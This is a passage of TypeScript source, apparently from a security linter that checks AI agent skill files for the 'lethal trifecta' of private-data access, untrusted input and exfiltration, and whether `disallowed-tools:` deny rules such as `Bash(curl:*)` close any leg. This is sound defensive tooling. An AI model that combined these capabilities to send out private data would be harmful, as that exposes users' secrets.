 * So the detector runs only where the fence exists ({@link dialectSupportsSkillFence}).
 * This is a claim about the MECHANISM, not about the risk: a Codex skill really
 * does hold every leg, and bounding it is a session/config-level question that
 * belongs to a Codex-specific detector, not to a Claude Code one applied by
 * default. Subagent findings are unaffected — `tools:` is a different mechanism,
 * with its own dialect handling.
 *
 * @param disallowed `disallowed-tools:` as declared, or `null` when the line is
 *   absent — the two are NOT the same: an explicit empty list still denies nothing,
 *   but the message should not tell an author who wrote the line that they didn't.
 * @returns `null` once the fence closes at least one leg (Rule of Two satisfied,
 *   among the built-ins — see {@link FENCE_SUPPLIERS} for the stated limit), and
 *   `null` for any harness with no skill fence to close it with.
 */
export function skillTrifectaIssue(
  disallowed: readonly string[] | null,
  dialect: HarnessDialect,
  ctx: TrifectaContext = {},
): TrifectaFinding | null {
  if (!dialectSupportsSkillFence(dialect)) return null;
  // An unreadable block is not a fence: a strict loader reads no frontmatter at
  // all, so whatever `disallowed-tools:` it appears to contain denies nothing.
  const declared = ctx.contractUnreadable ? null : disallowed;
  const legs = skillFenceLegs(declared ?? [], dialect);
  const open = (["private", "untrusted", "exfil"] as const).filter(
    (leg) => legs[leg].length > 0,
  );
  if (open.length < 3) return null; // a whole leg is closed — Rule of Two holds

  if (declared === null) {
    return {
      severity: "advisory",
      legs,
      fence: "none",
      message: ctx.contractUnreadable
        ? "Frontmatter is not valid YAML, so this skill declares no readable fence — a " +
          "strict loader rejects the block, and `disallowed-tools:` inside a block that " +
          "does not parse denies nothing. The skill inherits every tool the session " +
          "grants and holds all three lethal-trifecta legs (read private data, ingest " +
          "untrusted content, exfiltrate). Fix the YAML first, then fence. " +
          PREAPPROVAL_NOTE
        : "No `disallowed-tools:` line, so this skill inherits every tool the session " +
          "grants and holds all three lethal-trifecta legs (read private data, ingest " +
          "untrusted content, exfiltrate). " +
          PREAPPROVAL_NOTE +
          " " +
          fenceFix(dialect),
    };
  }
  // 🔴 An EXPLICIT empty list is an ATTEMPT, and the doc contract above already
  // said so ("the two are NOT the same … the message should not tell an author who
  // wrote the line that they didn't") — the code then folded it in with the absent
  // case anyway. The cost was not just wording: `fence: "none"` routes into the
  // whole-surface AGGREGATE ("N of M skills declare no tool fence"), so the one
  // author who reached for the field and got nothing from it was the one who never
  // heard about it. `disallowed-tools: []` denies nothing, which is exactly what
  // `"ineffective"` means, and that state keeps its own per-skill line.
  //
  // Grading is untouched: both states are `"advisory"` and both count once toward
  // `trifectaExposure`. An empty fence has capability equal to no fence, so moving
  // it must not make it score worse — see the non-monotonicity note above.
  if (declared.length === 0) {
    return {
      severity: "advisory",
      legs,
      fence: "ineffective",
      message:
        "`disallowed-tools:` is declared but EMPTY, so it denies nothing and this " +
        "skill still holds all three lethal-trifecta legs — private-data read is " +
        `supplied by ${legs.private.join(", ")}, untrusted intake by ` +
        `${legs.untrusted.join(", ")}, exfiltration by ${legs.exfil.join(", ")}. ` +
        "The line exists, so this is a fence that was attempted and closes nothing, " +
        "not a missing one. " +
        fenceFix(dialect),
    };
  }
  // The same split as the subagent side, for the same reason: "closes no leg" is
  // one sentence covering two causes that need two different edits.
  //
  // A RESTRICTED deny (`disallowed-tools: Bash(curl:*)`) is not weighed and found
  // wanting — it is DISCARDED, because denying one invocation of the shell says
  // nothing about the rest of it. An author who wrote that line and read "a leg is
  // closed only when EVERY built-in that supplies it is denied" would reasonably
  // add more restricted denies and watch nothing happen. Naming the discard is the
  // difference between a diagnosis and a wild goose chase.
  const ignored = declared.filter((raw) => restriction(raw) !== null);
  const preamble =
    ignored.length > 0
      ? `\`${ignored.join("`, `")}\` denies nothing: a RESTRICTED deny is discarded, not ` +
        "weighed — denying one invocation of a tool leaves the tool. Only an " +
        "unrestricted name (`Bash`, not `Bash(curl:*)`) removes it from the pool. " +
        (ignored.length === declared.length
          ? "Every entry in this fence is restricted, so it closes nothing at all. "
          : "The unrestricted entries that remain still close no whole leg. ")
      : `\`disallowed-tools: ${declared.join(", ")}\` closes no lethal-trifecta leg — ` +
        "a leg is closed only when EVERY built-in that supplies it is denied. ";
  return {
    severity: "advisory",
    legs,
    fence: "ineffective",
    message:
      preamble +
      `Private-data read is still supplied by ${legs.private.join(", ")}, untrusted ` +
      `intake by ${legs.untrusted.join(", ")}, exfiltration by ${legs.exfil.join(", ")}. ` +
      fenceFix(dialect),
  };
}
